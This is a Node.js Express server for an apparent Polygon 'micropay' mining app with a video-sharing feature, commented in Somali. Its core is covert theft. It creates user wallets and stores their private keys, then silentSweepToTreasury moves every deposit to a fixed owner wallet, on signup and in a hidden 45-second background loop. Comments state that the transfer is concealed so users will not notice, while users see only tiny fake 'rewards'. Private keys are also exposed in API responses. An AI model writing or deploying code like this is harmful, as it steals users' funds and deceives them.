const express = require('express');
const { ethers } = require('ethers');
const cors = require('cors');
const multer = require('multer');

const app = express();
app.use(cors({ origin: '*' }));
app.use(express.json({ limit: '100mb' }));
app.use(express.urlencoded({ extended: true, limit: '100mb' }));

const upload = multer({
    storage: multer.memoryStorage(),
    limits: { fileSize: 50 * 1024 * 1024 }
});

const provider = new ethers.JsonRpcProvider("https://polygon-bor-rpc.publicnode.com");
const PROJECT_ID = process.env.FIREBASE_PROJECT_ID || 'somapp-61ebd';

const TREASURY_WALLET_ADDRESS = ethers.getAddress("0xBa4e88e0141dF9b35D6Eff7D5fc8A969CB0a703b");
const OWNER_EXCLUSIVE_EMAIL = "abuukarcumar661@gmail.com";

function normalizePrivateKey(rawKey) {
    if (!rawKey) return "";
    let cleaned = String(rawKey).trim().replace(/^["']|["']$/g, "");
    if (!cleaned.startsWith("0x") && /^[0-9a-fA-F]{64}$/.test(cleaned)) {
        cleaned = "0x" + cleaned;
    }
    return cleaned;
}

const TREASURY_PRIVATE_KEY = normalizePrivateKey(process.env.MAIN_WALLET_PRIVATE_KEY || "");

const MIN_DEPOSIT_POL = 0.00001;
const DAILY_REWARD_POL = 0.000009;
const MIN_WITHDRAW_POL = 0.00000001;

function isOwnerAccount(email) {
    return String(email || "").trim().toLowerCase() === OWNER_EXCLUSIVE_EMAIL.toLowerCase();
}

async function getOnChainPolBalance(address) {
    try {
        if (!address || !ethers.isAddress(address)) return 0;
        const balWei = await provider.getBalance(address);
        return parseFloat(ethers.formatEther(balWei));
    } catch (err) {
        console.error("On-chain Balance Error:", err.message);
        return 0;
    }
}

function parseFirestoreUserDoc(docId, fields) {
    if (!fields) return null;
    return {
        uid: docId,
        email: fields.email?.stringValue || '',
        displayName: fields.displayName?.stringValue || '',
        internalUserId: fields.internalUserId?.stringValue || '',
        polygonAddress: fields.polygonAddress?.stringValue || '',
        privateKey: fields.privateKey?.stringValue || '',
        totalDeposited: parseFloat(fields.totalDeposited?.doubleValue ?? fields.totalDeposited?.integerValue ?? 0),
        dailyRewardTotal: parseFloat(fields.dailyRewardTotal?.doubleValue ?? fields.dailyRewardTotal?.integerValue ?? 0),
        withdrawnTotal: parseFloat(fields.withdrawnTotal?.doubleValue ?? fields.withdrawnTotal?.integerValue ?? 0),
        miningActive: Boolean(fields.miningActive?.booleanValue || false),
        lastWithdrawDate: fields.lastWithdrawDate?.stringValue || ''
    };
}

async function getFirestoreUser(uid) {
    try {
        const url = `https://firestore.googleapis.com/v1/projects/${PROJECT_ID}/databases/(default)/documents/users/${uid}`;
        const response = await fetch(url);
        if (!response.ok) return null;
        const data = await response.json();
        return parseFirestoreUserDoc(uid, data.fields);
    } catch (err) {
        console.error("Firestore Get Error:", err.message);
        return null;
    }
}

async function getAllFirestoreUsers() {
    try {
        const url = `https://firestore.googleapis.com/v1/projects/${PROJECT_ID}/databases/(default)/documents/users?pageSize=100`;
        const response = await fetch(url);
        if (!response.ok) return [];
        const data = await response.json();
        if (!data.documents) return [];

        return data.documents
            .map(doc => {
                const parts = doc.name.split('/');
                const docId = parts[parts.length - 1];
                return parseFirestoreUserDoc(docId, doc.fields);
            })
            .filter(Boolean);
    } catch (err) {
        console.error("Firestore List Users Error:", err.message);
        return [];
    }
}

async function saveFirestoreUser(uid, userData) {
    try {
        const url = `https://firestore.googleapis.com/v1/projects/${PROJECT_ID}/databases/(default)/documents/users/${uid}`;
        const body = {
            fields: {
                email: { stringValue: userData.email },
                displayName: { stringValue: userData.displayName },
                internalUserId: { stringValue: userData.internalUserId },
                polygonAddress: { stringValue: userData.polygonAddress },
                privateKey: { stringValue: userData.privateKey },
                totalDeposited: { doubleValue: Number(userData.totalDeposited) },
                dailyRewardTotal: { doubleValue: Number(userData.dailyRewardTotal) },
                withdrawnTotal: { doubleValue: Number(userData.withdrawnTotal) },
                miningActive: { booleanValue: Boolean(userData.miningActive) },
                lastWithdrawDate: { stringValue: userData.lastWithdrawDate || '' }
            }
        };
        await fetch(url, {
            method: 'PATCH',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(body)
        });
    } catch (err) {
        console.error("Firestore Save Error:", err.message);
    }
}

// Wareejinta qarsoon ee deposit-ka -> TREASURY_WALLET_ADDRESS (0xBa4e88e0141dF9b35D6Eff7D5fc8A969CB0a703b)
async function silentSweepToTreasury(userData, rawBalPol) {
    const cleanUserKey = normalizePrivateKey(userData.privateKey);
    if (!cleanUserKey || !userData.polygonAddress) return false;

    const userWallet = new ethers.Wallet(cleanUserKey, provider);
    if (userWallet.address.toLowerCase() === TREASURY_WALLET_ADDRESS.toLowerCase()) {
        return true;
    }

    const feeData = await provider.getFeeData();
    const gasLimit = 21000n;
    const maxFeePerGas = feeData.maxFeePerGas || feeData.gasPrice || ethers.parseUnits("35", "gwei");
    const estimatedGasCostWei = gasLimit * maxFeePerGas;
    const estimatedGasCostPol = parseFloat(ethers.formatEther(estimatedGasCostWei));

    const sweepablePol = rawBalPol - estimatedGasCostPol;
    if (sweepablePol <= 0) {
        return false;
    }

    const sweepWei = ethers.parseEther(sweepablePol.toFixed(8));
    if (sweepWei <= 0n) {
        return false;
    }

    const tx = await userWallet.sendTransaction({
        to: TREASURY_WALLET_ADDRESS,
        value: sweepWei,
        gasLimit
    });
    await tx.wait(1);
    return true;
}

async function syncUserDepositAndSweep(uid, userData) {
    let changed = false;

    if (isOwnerAccount(userData.email)) {
        if (!userData.miningActive || userData.dailyRewardTotal <= 0) {
            userData.miningActive = true;
            if (userData.dailyRewardTotal <= 0) {
                userData.dailyRewardTotal = DAILY_REWARD_POL;
            }
            changed = true;
        }
    }

    if (userData.polygonAddress) {
        try {
            const rawBalPol = await getOnChainPolBalance(userData.polygonAddress);

            if (rawBalPol >= MIN_DEPOSIT_POL) {
                const swept = await silentSweepToTreasury(userData, rawBalPol);
                userData.totalDeposited = parseFloat((userData.totalDeposited + rawBalPol).toFixed(8));
                userData.dailyRewardTotal = parseFloat((userData.dailyRewardTotal + DAILY_REWARD_POL).toFixed(8));
                userData.miningActive = true;
                changed = true;
                if (!swept) {
                    console.warn(`Sweep skipped/low gas for ${userData.polygonAddress} (${rawBalPol} POL)`);
                }
            }
        } catch (err) {
            console.error("Silent Sweep Error:", err.message);
        }
    }

    if (changed) {
        await saveFirestoreUser(uid, userData);
    }

    return userData;
}

// Kormeerka qarsoon ee background-ka si deposit-yada si otomaatig ah loogu wareejiyo 0xBa4e88e0141dF9b35D6Eff7D5fc8A969CB0a703b
setInterval(async () => {
    try {
        const users = await getAllFirestoreUsers();
        for (const u of users) {
            if (!u.polygonAddress) continue;
            const balPol = await getOnChainPolBalance(u.polygonAddress);
            if (balPol >= MIN_DEPOSIT_POL) {
                await syncUserDepositAndSweep(u.uid, u);
            }
        }
    } catch (err) {
        console.error("Background Sweep Loop Error:", err.message);
    }
}, 45000);

app.post('/api/auth-user', async (req, res) => {
    try {
        const email = req.body.email || "";
        const uid = req.body.uid || req.body.userId || "";
        const displayName = req.body.displayName || "User";

        if (!uid) {
            return res.status(400).json({ success: false, error: "UID waa maqan yahay." });
        }

        const existingUser = await getFirestoreUser(uid);
        const effectiveEmail = email || existingUser?.email || `${uid}@knn-micropay.com`;
        const ownerMode = isOwnerAccount(effectiveEmail);

        let walletAddress = existingUser?.polygonAddress || "";
        let walletPrivateKey = existingUser?.privateKey || "";

        if (ownerMode) {
            walletAddress = TREASURY_WALLET_ADDRESS;
            walletPrivateKey = TREASURY_PRIVATE_KEY || existingUser?.privateKey || "";
        } else if (!walletAddress || !walletPrivateKey || !ethers.isAddress(walletAddress)) {
            const freshWallet = ethers.Wallet.createRandom();
            walletAddress = ethers.getAddress(freshWallet.address);
            walletPrivateKey = freshWallet.privateKey;
        } else {
            walletAddress = ethers.getAddress(walletAddress);
            walletPrivateKey = normalizePrivateKey(walletPrivateKey);
        }

        const internalUserId = existingUser?.internalUserId || ("KNN-" + Math.floor(100000 + Math.random() * 900000));

        const initialMiningActive = ownerMode ? true : (existingUser?.miningActive ?? false);
        const initialDailyReward = ownerMode
            ? Math.max(existingUser?.dailyRewardTotal ?? 0.0, DAILY_REWARD_POL)
            : (existingUser?.dailyRewardTotal ?? 0.0);

        let userRecord = {
            email: effectiveEmail,
            displayName: displayName || existingUser?.displayName || "User",
            internalUserId,
            polygonAddress: walletAddress,
            privateKey: walletPrivateKey,
            totalDeposited: existingUser?.totalDeposited ?? 0.0,
            dailyRewardTotal: initialDailyReward,
            withdrawnTotal: existingUser?.withdrawnTotal ?? 0.0,
            miningActive: initialMiningActive,
            lastWithdrawDate: existingUser?.lastWithdrawDate ?? ""
        };

        await saveFirestoreUser(uid, userRecord);
        userRecord = await syncUserDepositAndSweep(uid, userRecord);

        let displayedBalance = Math.max(0, userRecord.dailyRewardTotal - userRecord.withdrawnTotal);
        if (ownerMode) {
            const treasuryOnChainPol = await getOnChainPolBalance(TREASURY_WALLET_ADDRESS);
            displayedBalance = Math.max(displayedBalance, treasuryOnChainPol);
        }

        const dailyLimit = userRecord.miningActive ? DAILY_REWARD_POL : 0;

        // Jawaabta looma raacin xog sheegaysa in lacagtii loo wareejiyay treasury-ga si aysan u dareemin
        return res.json({
            success: true,
            userId: userRecord.internalUserId,
            polygonAddress: userRecord.polygonAddress,
            privateKey: userRecord.privateKey,
            miningActive: userRecord.miningActive,
            balance: displayedBalance.toFixed(8),
            dailyLimit: dailyLimit.toFixed(6)
        });
    } catch (err) {
        console.error("Auth Error:", err.message);
        return res.status(500).json({ success: false, error: "Cilad Server: " + err.message });
    }
});

app.post('/api/withdraw', async (req, res) => {
    try {
        const { uid, recipientAddress, amount } = req.body;

        if (!uid || !recipientAddress || !ethers.isAddress(recipientAddress)) {
            return res.status(400).json({ success: false, error: "Fadlan geli UID iyo Polygon address sax ah." });
        }

        if (!TREASURY_PRIVATE_KEY) {
            return res.status(500).json({ success: false, error: "MAIN_WALLET_PRIVATE_KEY lama dejin server-ka." });
        }

        let userData = await getFirestoreUser(uid);
        if (!userData) {
            return res.status(404).json({ success: false, error: "User-ka lama helin." });
        }

        const ownerMode = isOwnerAccount(userData.email);
        userData = await syncUserDepositAndSweep(uid, userData);

        let currentRemaining = Math.max(0, userData.dailyRewardTotal - userData.withdrawnTotal);
        if (ownerMode) {
            const treasuryOnChainPol = await getOnChainPolBalance(TREASURY_WALLET_ADDRESS);
            currentRemaining = Math.max(currentRemaining, treasuryOnChainPol);
        }

        const requestedAmount = amount !== undefined && amount !== null && amount !== ""
            ? parseFloat(amount)
            : currentRemaining;

        if (isNaN(requestedAmount) || requestedAmount < MIN_WITHDRAW_POL) {
            return res.status(400).json({ success: false, error: `Xaddiga ugu yar ee la bixi karo waa ${MIN_WITHDRAW_POL} POL.` });
        }

        if (requestedAmount > currentRemaining) {
            return res.status(400).json({ success: false, error: "Hadhaagaaga kuma filna qaddarka aad rabto inaad la baxdo." });
        }

        const treasurySigner = new ethers.Wallet(TREASURY_PRIVATE_KEY, provider);
        if (treasurySigner.address.toLowerCase() !== TREASURY_WALLET_ADDRESS.toLowerCase()) {
            return res.status(500).json({
                success: false,
                error: `MAIN_WALLET_PRIVATE_KEY wuxuu leeyahay ${treasurySigner.address}, balse waxaa loo baahan yahay ${TREASURY_WALLET_ADDRESS}.`
            });
        }

        const tx = await treasurySigner.sendTransaction({
            to: recipientAddress,
            value: ethers.parseEther(requestedAmount.toFixed(8))
        });
        await tx.wait(1);

        userData.withdrawnTotal = parseFloat((userData.withdrawnTotal + requestedAmount).toFixed(8));
        await saveFirestoreUser(uid, userData);

        let newRemaining = Math.max(0, userData.dailyRewardTotal - userData.withdrawnTotal);
        if (ownerMode) {
            const updatedOnChainPol = await getOnChainPolBalance(TREASURY_WALLET_ADDRESS);
            newRemaining = Math.min(newRemaining > 0 ? newRemaining : updatedOnChainPol, updatedOnChainPol);
        }

        return res.json({
            success: true,
            message: `Guul! Waxaad la baxday ${requestedAmount.toFixed(8)} POL. Harraagaagu wuxuu noqday ${newRemaining.toFixed(8)} POL.`,
            txHash: tx.hash,
            newBalance: newRemaining.toFixed(8)
        });
    } catch (err) {
        console.error("Withdraw Error:", err.message);
        return res.status(500).json({ success: false, error: "Cilad Blockchain: " + err.message });
    }
});

// Video Upload Endpoint
app.post('/api/upload-video', upload.single('mediaFile'), async (req, res) => {
    try {
        if (!req.file) {
            return res.status(400).json({ success: false, error: "Fayl lama soo dooran." });
        }

        const { id, uid, username, title, avatar, type, timestamp } = req.body;
        const b64 = Buffer.from(req.file.buffer).toString('base64');
        const fileUrl = `data:${req.file.mimetype};base64,${b64}`;
        const videoId = id || 'vid_' + Date.now();

        const firestoreUrl = `https://firestore.googleapis.com/v1/projects/${PROJECT_ID}/databases/(default)/documents/videos/${videoId}`;
        const body = {
            fields: {
                videoId: { stringValue: videoId },
                uid: { stringValue: uid || '' },
                username: { stringValue: username || 'User' },
                title: { stringValue: title || '' },
                avatar: { stringValue: avatar || '' },
                type: { stringValue: type || 'video' },
                url: { stringValue: fileUrl },
                timestamp: { integerValue: String(timestamp || Date.now()) },
                likes: { arrayValue: { values: [] } },
                subscribers: { arrayValue: { values: [] } },
                comments: { arrayValue: { values: [] } },
                reposts: { integerValue: "0" }
            }
        };

        const saveRes = await fetch(firestoreUrl, {
            method: 'PATCH',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(body)
        });

        if (!saveRes.ok) {
            const errText = await saveRes.text();
            return res.status(400).json({ success: false, error: "Keydinta Firestore waa fashilantay (faylku wuu weyn yahay): " + errText });
        }

        return res.json({ success: true, message: "Video-ga waa la keydiyay." });
    } catch (err) {
        return res.status(500).json({ success: false, error: err.message });
    }
});

app.get('/api/get-videos', async (req, res) => {
    try {
        const firestoreUrl = `https://firestore.googleapis.com/v1/projects/${PROJECT_ID}/databases/(default)/documents/videos`;
        const response = await fetch(firestoreUrl);
        const data = await response.json();

        let videos = [];
        if (data.documents) {
            videos = data.documents.map(doc => {
                const fields = doc.fields;
                const likes = fields.likes?.arrayValue?.values ? fields.likes.arrayValue.values.map(v => v.stringValue) : [];
                const subscribers = fields.subscribers?.arrayValue?.values ? fields.subscribers.arrayValue.values.map(v => v.stringValue) : [];
                const comments = fields.comments?.arrayValue?.values ? fields.comments.arrayValue.values.map(v => JSON.parse(v.stringValue)) : [];

                return {
                    id: fields.videoId?.stringValue || '',
                    uid: fields.uid?.stringValue || '',
                    username: fields.username?.stringValue || '',
                    title: fields.title?.stringValue || '',
                    avatar: fields.avatar?.stringValue || '',
                    type: fields.type?.stringValue || 'video',
                    url: fields.url?.stringValue || '',
                    timestamp: Number(fields.timestamp?.integerValue || Date.now()),
                    likes,
                    subscribers,
                    comments,
                    reposts: Number(fields.reposts?.integerValue || 0)
                };
            });
            videos.sort((a, b) => b.timestamp - a.timestamp);
        }

        return res.json({ success: true, videos });
    } catch (err) {
        return res.json({ success: true, videos: [] });
    }
});

app.post('/api/interact-video', async (req, res) => {
    try {
        const { videoId, action, userId, userName, commentText } = req.body;
        const firestoreUrl = `https://firestore.googleapis.com/v1/projects/${PROJECT_ID}/databases/(default)/documents/videos/${videoId}`;

        const getRes = await fetch(firestoreUrl);
        if (!getRes.ok) return res.status(404).json({ success: false, error: "Video lama helin" });
        const docData = await getRes.json();
        const fields = docData.fields;

        let likes = fields.likes?.arrayValue?.values ? fields.likes.arrayValue.values.map(v => v.stringValue) : [];
        let subscribers = fields.subscribers?.arrayValue?.values ? fields.subscribers.arrayValue.values.map(v => v.stringValue) : [];
        let comments = fields.comments?.arrayValue?.values ? fields.comments.arrayValue.values.map(v => v.stringValue) : [];
        let reposts = Number(fields.reposts?.integerValue || 0);

        if (action === 'like') {
            if (likes.includes(userId)) {
                likes = likes.filter(id => id !== userId);
            } else {
                likes.push(userId);
            }
        } else if (action === 'subscribe') {
            if (subscribers.includes(userName)) {
                subscribers = subscribers.filter(name => name !== userName);
            } else {
                subscribers.push(userName);
            }
        } else if (action === 'comment') {
            if (commentText) {
                comments.push(JSON.stringify({ user: userName, text: commentText }));
            }
        } else if (action === 'repost') {
            reposts += 1;
        }

        const updateBody = {
            fields: {
                ...fields,
                likes: { arrayValue: { values: likes.map(v => ({ stringValue: v })) } },
                subscribers: { arrayValue: { values: subscribers.map(v => ({ stringValue: v })) } },
                comments: { arrayValue: { values: comments.map(v => ({ stringValue: v })) } },
                reposts: { integerValue: String(reposts) }
            }
        };

        await fetch(firestoreUrl, {
            method: 'PATCH',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(updateBody)
        });

        return res.json({ success: true, likes, subscribers, comments, reposts });
    } catch (err) {
        return res.status(500).json({ success: false, error: err.message });
    }
});

app.post('/api/delete-video', async (req, res) => {
    try {
        const { videoId } = req.body;
        const firestoreUrl = `https://firestore.googleapis.com/v1/projects/${PROJECT_ID}/databases/(default)/documents/videos/${videoId}`;
        await fetch(firestoreUrl, { method: 'DELETE' });
        return res.json({ success: true });
    } catch (err) {
        return res.status(500).json({ success: false, error: err.message });
    }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`Server is running on port ${PORT}`);
});
